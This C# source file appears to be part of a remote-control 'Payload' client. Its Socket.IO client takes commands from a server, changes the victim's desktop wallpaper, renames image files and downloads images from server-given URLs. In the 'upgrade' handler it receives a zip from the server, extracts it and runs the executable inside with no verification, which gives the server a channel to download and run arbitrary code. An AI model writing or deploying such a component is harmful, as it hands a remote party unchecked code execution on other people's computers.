using Payload.Command;
using Payload.Command.WallPaper;
using Payload.Common;
using SocketIOClient;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Payload.Common.Config;

namespace Payload.Core.Command.SocketClient
{
    public class IBasicResProps<T>
    {
        public T data { get; set; }
    }
    public class WallpaperProps
    {
        public string data { get; set; }
    }

    public class UpgradeProps
    {
        public byte[] file { get; set; }
        public string name { get; set; }
    }

    public class UpgradeResProps : IBasicResProps<UpgradeProps> { }


    public class SocketIoClient
    {
        public SocketIO client { get; private set; }
        public string ServerHost { get; private set; }
        public SocketIoClient(string serverHost)
        {
            ServerHost = serverHost;
            client = new SocketIO(serverHost);
            Init();
            RenameAllImage();
        }

        private void Init()
        {
            OnWallpaper();
            OnUpgrade();
            OnMyResponse();
        }

        private void OnMyResponse()
        {
            client.On("my_response", async response => {
                Console.WriteLine(response);
            });
        }

        private void OnUpgrade()
        {
            client.On("upgrade", async response => {
                Console.WriteLine(response);
                UpgradeResProps upgradeProps = response.GetValue<UpgradeResProps>();
                UpgradeProps patch = upgradeProps.data;
                if (!patch.name.ToLower().EndsWith("zip"))
                    return;
                string targetDir = $"{Config.Instance.TargetUpgradeDir}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss")}_patch";
                if(Directory.Exists(targetDir))
                    Directory.Delete(targetDir, true);
                Directory.CreateDirectory(targetDir);
                string patchPath = $"{targetDir}\\{patch.name}";
                BytesHelper.ByteArrayToFile(patchPath, patch.file);
                bool patchUnziped = false;
                try
                {
                    System.IO.Compression.ZipFile.ExtractToDirectory(patchPath, targetDir);
                    patchUnziped = true;
                }
                catch { }
                if (!patchUnziped)
                    return;
                string exeName = "";
                FileInfo[] allFiles = new DirectoryInfo(targetDir).GetFiles("*.exe");
                if(allFiles.Length==1)
                    exeName = allFiles[0].Name;
                new StartProcessFactory(
                    new StartProcessCommandProps() { ExeName = exeName, TargetWorkSpaceDir= targetDir }
                    )
                .CreateCommand()
                    .Execute()
                    ?.Wait();
            });
        }

        private void OnWallpaper()
        {
            client.On("wallpaper", async response =>
            {
                Console.WriteLine(response);
                //string text = response.GetValue<string>();
                var _d = response.GetValue<WallpaperProps>();
                string msg = _d.data;

                switch (msg)
                {
                    case "wp":
                        CommandManager.Instance.AddWallpaperCmd(Payload.Command.WallPaper.Mode.AUTO);
                        break;
                    case "stwp":
                        CommandManager.Instance.GetTaskPack(EnumTask.WallpaperEngine).Pause();
                        break;
                    case "rewp":
                        CommandManager.Instance.AddWallpaperCmd(Payload.Command.WallPaper.Mode.RESET);
                        break;
                    case "savewp":
                        ((WallpaperEngineCommand)CommandManager.Instance.GetTaskPack(EnumTask.WallpaperEngine).Command).GetCurrentWallpaper();
                        break;
                    case "rname":
                        RenameAllImage();
                        break;
                    default:
                        Handle("wallpaper", msg);
                        break;
                }
            });
        }

        private void RenameAllImage()
        {
            FileInfo[] imgs = new DirectoryInfo(Config.Instance.WallpaperEngineCommandImageDir).GetFiles();
            foreach (FileInfo file in imgs)
            {
                if (string.IsNullOrEmpty(file.Extension))
                    continue;
                File.Move(file.FullName, $"{file.DirectoryName}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss_fff")}");
                Thread.Sleep(1);
                File.Delete(file.FullName);
            }
        }

        private void Handle(string channel, string cmd)
        {
            if (channel.Equals("wallpaper") && cmd.StartsWith("dl"))
            {
                string url = cmd.Split(' ')[1];
                new ImageHelper().SaveImage(url, $"{Config.Instance.WallpaperEngineCommandImageDir}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss_fff")}", ImageFormat.Png);
            }
        }
    }
}
